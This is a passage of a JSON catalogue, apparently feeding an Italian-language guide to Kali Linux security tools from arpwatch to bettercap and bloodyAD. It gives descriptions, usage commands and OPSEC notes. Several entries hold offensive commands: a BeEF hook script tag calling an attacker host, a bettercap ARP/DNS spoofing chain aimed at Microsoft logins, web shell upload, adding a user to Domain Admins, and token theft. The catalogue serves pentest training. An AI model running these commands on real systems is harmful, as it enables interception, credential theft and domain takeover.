      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "arpwatch",
    "name": "arpwatch",
    "version": "2.1a15",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/arpwatch/",
    "desc": "Monitora attività ARP per rilevare nuovi host e possibili attacchi ARP spoofing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Arpwatch è un demone di monitoraggio che osserva il traffico ARP su una rete locale, mantenendo un database delle associazioni IP/MAC. Quando rileva cambiamenti (nuovi host, cambio di MAC per un IP esistente, flip-flop tra MAC), genera alert via email o syslog. È uno strumento difensivo essenziale per rilevare attacchi ARP spoofing/poisoning e dispositivi non autorizzati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP/MAC Tracking:</strong> Mantiene uno storico persistente delle associazioni IP-MAC osservate sulla rete.</p><p><strong>Anomaly Detection:</strong> Segnala eventi sospetti: nuove stazioni, cambi di MAC (possibile spoofing), flip-flop (MAC che cambiano ripetutamente).</p><p><strong>Alerting:</strong> Invia notifiche via email o log di sistema per ogni evento rilevato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio monitoraggio su interfaccia\nsudo arpwatch -i eth0\n\n# Con file di output personalizzato\nsudo arpwatch -i eth0 -f /var/lib/arpwatch/eth0.dat\n\n# Visualizza database corrente\ncat /var/lib/arpwatch/arp.dat</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Security Monitoring</strong>, rileva attacchi MITM in tempo reale (quando un attaccante spoofa il gateway). Per <strong>Asset Management</strong>, traccia l'ingresso di nuovi dispositivi nella rete. In <strong>Compliance</strong>, fornisce audit trail delle connessioni di rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Attaccanti:</strong> La presenza di arpwatch indica che attacchi ARP potrebbero essere rilevati. Tecniche stealth o attacchi a livello superiore potrebbero essere preferibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "asleap",
    "name": "asleap",
    "version": "2.3~git20201128.254acab",
    "icon": "../app/icons/asleap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/asleap/",
    "desc": "Attacca autenticazione LEAP/PPTP estraendo e craccando credenziali MS-CHAPv2.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Asleap è uno strumento specializzato nell'attacco al protocollo LEAP (Lightweight Extensible Authentication Protocol) di Cisco e a qualsiasi sistema che utilizza MS-CHAPv2. Questi protocolli, ancora diffusi in reti WiFi enterprise legacy e VPN PPTP, hanno una debolezza crittografica fondamentale: il challenge-response può essere attaccato offline per recuperare la password in chiaro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Packet Capture Analysis:</strong> Estrae i challenge e response MS-CHAPv2 da catture pcap di traffico wireless o VPN.</p><p><strong>Offline Cracking:</strong> Attacca gli hash estratti usando dizionari o tabelle precomputate (genkeys), sfruttando la debolezza del DES usato in MS-CHAPv2.</p><p><strong>Live Attack:</strong> Può operare in tempo reale sniffando il traffico wireless e attaccando le autenticazioni al volo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Generazione tabelle hash (una tantum)\ngenkeys -r dict.txt -f wordlist.dat -n index.dat\n\n# Crack da cattura pcap\nasleap -r capture.pcap -f wordlist.dat -n index.dat\n\n# Attack live su interfaccia monitor\nasleap -i wlan0mon -f wordlist.dat -n index.dat</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting</strong> contro reti enterprise con LEAP (deprecato ma ancora presente). Per attaccare <strong>VPN PPTP</strong> che usano MS-CHAPv2. Dimostra perché questi protocolli sono considerati insicuri e dovrebbero essere migrati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Requisiti:</strong> Richiede la cattura del handshake MS-CHAPv2. Per LEAP, necessita monitor mode e possibilmente deauth per forzare ri-autenticazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "assetfinder",
    "name": "assetfinder",
    "version": "0.1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/assetfinder/",
    "desc": "Trova sottodomini e asset correlati a un dominio usando fonti passive.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Assetfinder è un tool leggero e veloce per la discovery passiva di sottodomini. Interroga multiple fonti di dati (crt.sh, Certspotter, HackerTarget, Facebook CT, VirusTotal) per raccogliere tutti i sottodomini noti associati a un dominio, senza inviare alcun traffico diretto al target. È progettato per essere usato in pipeline con altri tool di reconnaissance.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Aggregation:</strong> Combina risultati da diverse fonti di Certificate Transparency, DNS passivo e threat intelligence.</p><p><strong>Fast & Lightweight:</strong> Scritto in Go, è estremamente veloce e produce output pulito (un sottodominio per riga) ideale per piping.</p><p><strong>Zero Interaction:</strong> Non contatta mai il target direttamente, garantendo stealth totale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione base\nassetfinder target.com\n\n# Solo sottodomini (esclude domini correlati)\nassetfinder --subs-only target.com\n\n# Pipeline con altri tool\nassetfinder --subs-only target.com | httprobe | nuclei -t cves/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Primo passo nella <strong>Reconnaissance</strong> per ottenere rapidamente una lista di sottodomini da approfondire. Per <strong>Bug Bounty</strong>, la velocità permette di enumerare molti target in poco tempo. In combinazione con <code>httprobe</code> e <code>nuclei</code>, forma una pipeline efficace per trovare vulnerabilità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Dipende dalla completezza delle fonti esterne. Per copertura completa, combinare con tool attivi come <code>amass</code> o brute force DNS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "autopsy",
    "name": "autopsy",
    "version": "2.24",
    "icon": "../app/icons/autopsy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/autopsy/",
    "desc": "Piattaforma forense open source per analisi di immagini disco, timeline e carving.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Autopsy è la piattaforma forense digitale open source più diffusa al mondo. Fornisce un'interfaccia grafica completa per l'analisi di immagini disco, costruita sopra The Sleuth Kit. Permette agli investigatori di esaminare filesystem, recuperare file cancellati, costruire timeline di attività, cercare keyword e analizzare artefatti web, email e registri di sistema in modo strutturato e documentabile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Timeline Analysis:</strong> Costruisce una cronologia unificata di tutti gli eventi del sistema (creazione file, accessi, modifiche registro) per ricostruire le azioni dell'utente.</p><p><strong>File Carving:</strong> Recupera file cancellati analizzando lo spazio non allocato alla ricerca di header e footer di file noti (immagini, documenti, eseguibili).</p><p><strong>Artifact Extraction:</strong> Moduli specializzati estraggono automaticamente cronologia browser, email, messaggi, metadati EXIF e altri artefatti forensi.</p><p><strong>Keyword Search:</strong> Indicizza l'intero contenuto del disco per ricerche full-text su parole chiave investigative.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio interfaccia grafica\nautopsy\n\n# Workflow tipico:\n# 1. Crea nuovo caso\n# 2. Aggiungi data source (immagine disco)\n# 3. Esegui Ingest Modules (analisi automatica)\n# 4. Esamina risultati e genera report</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard per <strong>Digital Forensics</strong> in indagini di cybercrime, frode e incident response. Per <strong>Incident Response</strong>, permette l'analisi di dischi compromessi per ricostruire l'attacco. In ambito <strong>Legal/eDiscovery</strong>, fornisce report documentabili per procedimenti legali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Preservazione Evidenze:</strong> Lavorare sempre su copie forensi (immagini bit-by-bit). Non modificare mai l'originale.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "azurehound",
    "name": "azurehound",
    "version": "2.7.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/azurehound/",
    "desc": "Raccoglie dati da Azure AD per analisi con BloodHound, mappa relazioni e privilegi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>AzureHound è il collector ufficiale di BloodHound per ambienti Microsoft Azure e Entra ID (ex Azure AD). Enumera utenti, gruppi, ruoli, applicazioni, service principal e le loro relazioni di permessi, generando dati importabili in BloodHound per visualizzare percorsi di attacco nel cloud. È essenziale per il pentesting di infrastrutture ibride o cloud-native Microsoft.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Entra ID Collection:</strong> Raccoglie utenti, gruppi, ruoli directory, membership e permessi delegati dall'identity provider cloud.</p><p><strong>Azure RM Enumeration:</strong> Mappa subscription, resource group, VM, storage account e i relativi permessi RBAC per identificare chi può controllare cosa.</p><p><strong>Application Analysis:</strong> Enumera App Registration e Service Principal con i loro permessi API (Graph, Azure), spesso vettori di privilege escalation.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Collection completa con device code flow (bypass MFA)\nazurehound -u user@tenant.com --device-code\n\n# Collection con access token esistente (da az cli o roadrecon)\nazurehound --access-token \"eyJ0eXAi...\" -t tenant-id\n\n# Collection mirata per ridurre rumore\nazurehound -u user@domain.com --tenant contoso.onmicrosoft.com \\\n  --collect users,groups,apps --output-dir ./azure_data/\n\n# Con certificato service principal (stealth)\nazurehound --cert /path/to/cert.pem --certpass P@ss \\\n  --app-id app-guid --tenant tenant-id\n\n# Pipeline: collect -&gt; import -&gt; query\nazurehound -u user@domain.com --output-dir ./data/ &amp;&amp; \\\n  bloodhound-import ./data/*.json\n\n# Roadtool integration per token theft\nroadrecon auth --device-code\nazurehound --access-token $(cat ~/.roadtools_auth | jq -r .accessToken)\n\n# Query post-import per Azure privilege paths\n# Global Admin paths\nMATCH p=shortestPath((n)-[*1..]->(m:AZRole {displayname:\"Global Administrator\"})) RETURN p</code></pre><p>L'output JSON va importato in BloodHound per la visualizzazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Cloud Pentesting</strong>, mappa i percorsi di escalation dai low-privilege user a Global Admin. Per <strong>Security Assessment</strong> Azure, identifica permessi eccessivi su applicazioni e service account. Complementa SharpHound per ambienti <strong>Hybrid AD</strong> dove le identità sono sincronizzate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le chiamate API Graph sono loggate. Azure AD può rilevare enumerazione anomala. Usare token con scope limitato quando possibile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "b374k",
    "name": "b374k",
    "version": "3.2.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/b374k/",
    "desc": "Web shell PHP con file manager, terminale, DB client e funzioni di rete.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>B374k è una web shell PHP avanzata progettata per il post-exploitation di server web compromessi. Una volta caricata, fornisce un'interfaccia web completa per controllare il server: file manager grafico, terminale interattivo, client database, tool di rete e funzionalità di esfiltrazione. È protetta da password ed è altamente personalizzabile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>File Manager:</strong> Navigazione completa del filesystem con upload, download, editing, rename, chmod e operazioni di massa.</p><p><strong>Terminal:</strong> Esecuzione di comandi shell direttamente dal browser con output interattivo.</p><p><strong>Database Client:</strong> Connessione a MySQL/MariaDB per query SQL, dump tabelle e gestione database.</p><p><strong>Network Tools:</strong> Port scanner, reverse shell, bind shell e funzionalità di tunneling integrate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Generazione shell personalizzata\nphp b374k.php -p password -o shell.php\n\n# Upload via vulnerabilità (es. file upload)\n# Accesso via browser: http://target.com/uploads/shell.php\n# Login con password configurata</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Web Exploitation</strong>, dopo aver ottenuto la capacità di uploadare file PHP, b374k fornisce un punto d'appoggio completo per l'escalation. Per <strong>CTF</strong>, è uno strumento rapido per interagire con server compromessi. In scenari di <strong>Red Team</strong>, permette persistenza web-based.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le web shell sono pesantemente firmate dagli antivirus web (ModSecurity, WAF). Richiede offuscamento per evitare detection. Il file su disco è un artefatto forense evidente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "beef-xss",
    "name": "beef-xss",
    "version": "0.5.4.0",
    "icon": "../app/icons/beef-xss-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/beef-xss/",
    "desc": "Framework per sfruttare XSS: hooking browser, keylogging, phishing, pivoting client-side.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>BeEF (Browser Exploitation Framework) trasforma una semplice vulnerabilità XSS in un vettore di attacco completo. Una volta che la vittima esegue l'hook JavaScript, il suo browser diventa uno \"zombie\" controllabile remotamente. BeEF offre centinaia di moduli per rubare credenziali, fare keylogging, lanciare attacchi di phishing, sfruttare vulnerabilità browser e usare la vittima come pivot per attaccare la rete interna.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Browser Hooking:</strong> Un piccolo script JS (hook.js) mantiene una connessione persistente con il server C2, permettendo il controllo del browser vittima.</p><p><strong>Information Gathering:</strong> Raccoglie automaticamente fingerprint del browser, plugin installati, IP interno (WebRTC), cronologia e cookie accessibili.</p><p><strong>Social Engineering:</strong> Moduli per fake update notifications, clipboard hijacking, fake flash player e phishing di credenziali.</p><p><strong>Network Discovery:</strong> Dalla posizione del browser vittima, può scansionare la rete interna e identificare host raggiungibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio server BeEF\nbeef-xss\n\n# Accesso console: http://127.0.0.1:3000/ui/panel\n# Default credentials: beef:beef\n\n# Hook da iniettare nella pagina vulnerabile:\n<script src=\"http://attacker:3000/hook.js\"></script></code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Web Pentesting</strong>, dimostra l'impatto reale di XSS oltre il semplice alert(). Per <strong>Red Team</strong>, permette di stabilire persistenza client-side e usare i browser dei dipendenti come pivot. In <strong>Social Engineering</strong>, i moduli di phishing sono molto convincenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'hook JS è firmato. Il traffico verso il server C2 può essere rilevato. Browser moderni con CSP possono bloccare l'esecuzione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "berate-ap",
    "name": "berate-ap",
    "version": "0.4.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/berate-ap/",
    "desc": "Crea access point malevoli per attacchi MITM su reti WiFi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Berate_ap è uno script che semplifica la creazione di access point malevoli (Rogue AP) per attacchi Man-in-the-Middle su reti wireless. Configura automaticamente hostapd, dnsmasq e le regole iptables necessarie per creare un AP funzionante che inoltra il traffico delle vittime attraverso la macchina dell'attaccante, permettendo intercettazione e manipolazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AP Setup Automation:</strong> Configura in un comando tutti i componenti necessari per un Rogue AP funzionante.</p><p><strong>Traffic Forwarding:</strong> Imposta NAT e routing per permettere alle vittime di navigare mentre il traffico viene intercettato.</p><p><strong>Integration:</strong> Progettato per funzionare con tool MITM come mitmproxy, sslstrip o bettercap.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Creazione AP base\nberate_ap wlan0 eth0 FreeWiFi\n\n# Con parametri specifici\nberate_ap --ssid \"Company_Guest\" --channel 6 wlan0 eth0</code></pre><p>Una volta attivo, le vittime che si connettono all'AP avranno tutto il traffico instradato attraverso l'attaccante.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting</strong>, crea rapidamente un AP Evil Twin per testare la consapevolezza degli utenti. Per <strong>Red Team</strong> in luoghi pubblici, permette di intercettare credenziali di utenti che si connettono al WiFi \"gratuito\". Usato con sslstrip per downgrade HTTPS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> Creare AP malevoli è illegale senza autorizzazione. Il traffico potrebbe contenere dati sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "bettercap",
    "name": "bettercap",
    "version": "2.33.0",
    "icon": "../app/icons/bettercap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bettercap/",
    "desc": "Swiss army knife per attacchi di rete: MITM, ARP spoof, WiFi, BLE, HID injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bettercap è il framework MITM più completo e moderno disponibile. Scritto in Go, supporta attacchi su reti Ethernet, WiFi, Bluetooth LE e dispositivi HID. Include un'interfaccia web interattiva, scripting in JavaScript e supporto per caplet (script di automazione). È il successore spirituale di ettercap, con architettura modulare e supporto per protocolli moderni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network MITM:</strong> ARP spoofing, DNS spoofing, DHCP spoofing con sniffer di credenziali integrato per HTTP, FTP, NTLM e altri protocolli.</p><p><strong>WiFi Attacks:</strong> Monitor mode, deauth, handshake capture, evil twin, PMKID attack - tutto integrato.</p><p><strong>BLE & HID:</strong> Scansione dispositivi Bluetooth Low Energy e attacchi di keystroke injection via HID (es. Rubber Ducky).</p><p><strong>Proxy Modules:</strong> HTTP/HTTPS proxy con capacità di injection JavaScript, SSL stripping e manipolazione contenuti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># MITM completo con HTTPS downgrade e JS injection\nsudo bettercap -iface eth0 -caplet hstshijack/hstshijack\n\n# ARP spoof gateway + DNS spoof per phishing\nsudo bettercap -iface eth0 -eval \"set arp.spoof.targets 192.168.1.0/24; \\\n  set dns.spoof.domains *.login.microsoftonline.com; set dns.spoof.address 10.0.0.5; \\\n  arp.spoof on; dns.spoof on; net.sniff on\"\n\n# WiFi deauth + handshake capture\nsudo bettercap -iface wlan0mon -eval \"wifi.recon on; wifi.deauth AA:BB:CC:DD:EE:FF\"\n\n# BLE enumeration e scrittura caratteristiche\nsudo bettercap -eval \"ble.recon on\" \nsudo bettercap -eval \"ble.enum AA:BB:CC:DD:EE:FF; ble.write AA:BB:CC:DD:EE:FF UUID data\"\n\n# Caplet automatizzato per credential sniffing completo\ncat &lt;&lt;EOF &gt; sniff.cap\nnet.probe on\nset arp.spoof.fullduplex true\nset arp.spoof.targets 192.168.1.0/24\narp.spoof on\nset net.sniff.local true\nnet.sniff on\nEOF\nsudo bettercap -caplet sniff.cap -eval \"events.stream off; events.on credentials\"\n\n# Proxy HTTP con JS injection custom\nset http.proxy.script /path/to/inject.js\nhttp.proxy on</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Pentesting</strong>, è lo strumento principale per attacchi MITM e credential sniffing. Per <strong>Red Team</strong>, i caplet permettono automazione di attacchi complessi. In <strong>IoT Security</strong>, la componente BLE permette di testare dispositivi smart.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> ARP spoofing è facilmente rilevabile da IDS e tool come arpwatch. Il traffico anomalo è un indicatore chiaro.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "binwalk",
    "name": "binwalk",
    "version": "2.4.3",
    "icon": "../app/icons/binwalk-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/binwalk/",
    "desc": "Analizza firmware ed estrae filesystem embedded, compressioni e file nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Binwalk è lo strumento standard per l'analisi e l'estrazione di firmware. Scansiona file binari alla ricerca di signature note (header di filesystem, algoritmi di compressione, bootloader, certificati) e può estrarre automaticamente i componenti identificati. È essenziale per la security research su dispositivi IoT, router, telecamere IP e qualsiasi apparato con firmware embedded.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Signature Scanning:</strong> Database esteso di magic bytes per identificare filesystem (squashfs, cramfs, jffs2), compressioni (gzip, lzma, xz), archivi e formati proprietari.</p><p><strong>Recursive Extraction:</strong> Estrae automaticamente contenuti compressi e filesystem nested, seguendo ricorsivamente le strutture embedded.</p><p><strong>Entropy Analysis:</strong> Visualizza l'entropia del file per identificare sezioni cifrate o compresse, utile quando le signature non sono riconosciute.</p><p><strong>Hexdump & Strings:</strong> Utility integrate per analisi manuale quando l'automatismo fallisce.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione signature con output dettagliato\nbinwalk -B -v firmware.bin | tee analysis.txt\n\n# Estrazione ricorsiva con tutti i plugin\nbinwalk -Me --run-as=root firmware.bin\n\n# Analisi entropia per identificare sezioni cifrate\nbinwalk -E --save firmware.bin  # genera grafico PNG\n\n# Estrazione manuale di sezione specifica\nbinwalk --dd='squashfs:squashfs:unsquashfs %e' firmware.bin\n\n# Pipeline completa firmware analysis\nbinwalk -Me firmware.bin &amp;&amp; \\\n  find ./_firmware.bin.extracted -name \"*.conf\" -exec grep -l \"password\" {} \\; &amp;&amp; \\\n  find ./_firmware.bin.extracted -name \"shadow\" -exec cat {} \\;\n\n# Estrazione con offset custom (bypass header)\nbinwalk --offset=0x1000 -e firmware.bin\n\n# Creazione signature custom per formati proprietari\nbinwalk --magic=/path/to/custom.magic firmware.bin\n\n# Confronto due firmware per diff\nbinwalk -W firmware_v1.bin firmware_v2.bin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>IoT Pentesting</strong>, il primo passo è sempre estrarre il firmware per analizzare configurazioni, credenziali hardcoded e vulnerabilità. Per <strong>Vulnerability Research</strong>, permette di ottenere i binari da analizzare con IDA/Ghidra. In <strong>CTF</strong>, spesso nascondono flag in firmware modificati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Firmware cifrati o con signature custom non vengono riconosciuti. Potrebbe richiedere reverse engineering del bootloader per ottenere le chiavi di decifratura.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "bloodhound-kali",
    "name": "bloodhound",
    "version": "8.1.0",
    "icon": "../app/icons/bloodhound-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bloodhound/",
    "desc": "Visualizza relazioni in Active Directory per trovare path di privilege escalation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>BloodHound rivoluziona l'analisi di Active Directory visualizzando le relazioni di trust, membership e permessi come un grafo navigabile. Utilizzando la teoria dei grafi, calcola automaticamente i percorsi di attacco più brevi da qualsiasi utente compromesso fino a Domain Admin. Trasforma ore di analisi manuale in query istantanee, rivelando path di privilege escalation che sarebbero impossibili da identificare altrimenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Attack Path Mapping:</strong> Query pre-configurate per trovare path verso Domain Admin, utenti Kerberoastable, deleghe pericolose e ACL abusabili.</p><p><strong>Visual Graph:</strong> Interfaccia grafica interattiva che mostra nodi (utenti, computer, gruppi) e relazioni (membership, sessioni, permessi).</p><p><strong>Custom Queries:</strong> Supporto per query Cypher personalizzate per analisi specifiche dell'ambiente.</p><p><strong>Data Collection:</strong> Utilizza SharpHound (Windows) o bloodhound-python (Linux) per raccogliere i dati dal dominio.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SharpHound stealth: collection mirata (meno rumore)\nSharpHound.exe -c DCOnly,GPOLocalGroup --outputdirectory C:\\Temp --zipfilename bh.zip\n\n# SharpHound loop per catturare sessioni nel tempo\nSharpHound.exe -c Session --Loop --Loopduration 02:00:00 --loopinterval 00:05:00\n\n# bloodhound-python via SOCKS proxy (pivoting)\nproxychains bloodhound-python -d domain.local -u user -p pass -ns 10.0.0.1 -c All --zip\n\n# Collection con hash NTLM (pass-the-hash)\nbloodhound-python -d domain.local -u admin --hashes aad3b:ntlmhash -ns dc01 -c All\n\n# Custom Cypher queries post-import\n# Shortest path to DA\nMATCH p=shortestPath((n:User {name:\"USER@DOMAIN.LOCAL\"})-[*1..]->(m:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"})) RETURN p\n\n# Kerberoastable users with path to DA\nMATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"})) RETURN u.name,LENGTH(p)\n\n# Mark owned e set starting point\nMATCH (n:User {name:\"COMPROMISED@DOMAIN.LOCAL\"}) SET n.owned=true RETURN n\n\n# Export report\nbloodhound --export-report /path/to/report.html</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Strumento <strong>imprescindibile</strong> in ogni AD pentest. Dopo l'accesso iniziale, BloodHound rivela immediatamente come raggiungere Domain Admin. Per <strong>Blue Team</strong>, identifica le debolezze strutturali da correggere. In <strong>Threat Hunting</strong>, evidenzia account con privilegi eccessivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> SharpHound genera traffico LDAP intensivo e sessioni SMB verso molti host. Defender for Identity rileva questa attività. Usare collection mirate invece di '-c All'.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "bloodyad",
    "name": "bloodyad",
    "version": "2.1.7",
    "icon": "../app/icons/bloodyad-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bloodyad/",
    "desc": "Tool AD per abusare ACL, deleghe, RBCD e modificare oggetti con privilegi minimi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>BloodyAD è un tool Python per l'abuso di Active Directory che opera via LDAP, permettendo di sfruttare misconfigurazioni di ACL e deleghe senza richiedere privilegi elevati. A differenza di tool che richiedono accesso locale a un Domain Controller, BloodyAD può essere eseguito da qualsiasi macchina con connettività LDAP, rendendolo ideale per attacchi da Linux o attraverso tunnel.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ACL Abuse:</strong> Aggiunge permessi, modifica ownership, sfrutta GenericAll/GenericWrite/WriteDacl per privilege escalation.</p><p><strong>RBCD Attack:</strong> Configura Resource-Based Constrained Delegation per impersonare utenti privilegiati.</p><p><strong>Shadow Credentials:</strong> Aggiunge msDS-KeyCredentialLink per ottenere TGT senza conoscere la password.</p><p><strong>Password Operations:</strong> Reset password, cambio password per account con diritti sufficienti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Aggiunta utente a gruppo\nbloodyAD -d domain.local -u user -p pass --host dc01 add groupMember \"Domain Admins\" targetuser\n\n# RBCD attack setup\nbloodyAD -d domain.local -u user -p pass --host dc01 add rbcd targetcomputer$ attackercomputer$\n\n# Shadow Credentials\nbloodyAD -d domain.local -u user -p pass --host dc01 add shadowCredentials targetuser</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando BloodHound identifica un path di escalation basato su ACL (es. \"User X ha GenericAll su User Y\"), BloodyAD è lo strumento per sfruttarlo. Per <strong>RBCD attacks</strong> è più pratico delle alternative PowerShell. Ideale per <strong>Linux-based pentesting</strong> senza necessità di Windows.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le modifiche AD sono loggate (Event ID 5136). Aggiungere membri a gruppi privilegiati genera alert. Rollback delle modifiche è essenziale.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "blue-hydra",
    "name": "blue-hydra",
    "version": "1.9.20",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/blue-hydra/",
    "desc": "Rileva e monitora dispositivi Bluetooth classici e BLE nelle vicinanze.",
